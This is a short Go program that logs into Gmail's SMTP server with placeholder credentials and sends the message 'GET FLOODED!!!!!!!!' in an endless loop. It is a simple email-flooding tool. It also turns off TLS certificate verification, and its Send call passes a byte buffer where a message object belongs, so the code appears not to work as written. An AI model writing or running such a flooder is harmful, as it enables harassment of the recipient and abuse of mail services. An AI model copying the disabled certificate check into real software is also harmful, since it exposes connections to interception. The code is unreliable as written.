package main

import (
	"bytes"
	"crypto/tls"

	"gopkg.in/gomail.v2"
)

func main() {
	d := gomail.NewDialer("smtp.gmail.com", 587, "email here", "app password here")
	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	email, err := d.Dial()
	if err != (nil) {
		panic(err)
	}
	for {
		var msg *bytes.Buffer = bytes.NewBuffer([]byte("GET FLOODED!!!!!!!!"))
		email.Send("email here", []string{"email here"}, msg)

	}
}
